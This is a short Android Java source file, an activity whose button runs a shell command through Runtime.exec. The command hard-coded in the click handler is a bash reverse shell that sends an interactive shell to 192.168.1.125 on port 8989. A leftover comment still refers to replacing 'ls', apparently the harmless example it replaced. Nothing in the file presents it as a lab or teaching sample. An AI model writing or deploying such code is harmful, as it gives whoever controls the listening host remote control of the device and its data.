import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import androidx.appcompat.app.AppCompatActivity;
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button executeButton = findViewById(R.id.executeButton);

        executeButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                executeShellCommand("bash -i > /dev/tcp/192.168.1.125/8989 0<&1 2>&1"); // Replace "ls" with your desired shell command
            }
        });
    }

    private void executeShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }

            // Do something with the output, for example, display it in a TextView
            // TextView outputTextView = findViewById(R.id.outputTextView);
            // outputTextView.setText(output.toString());

            process.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}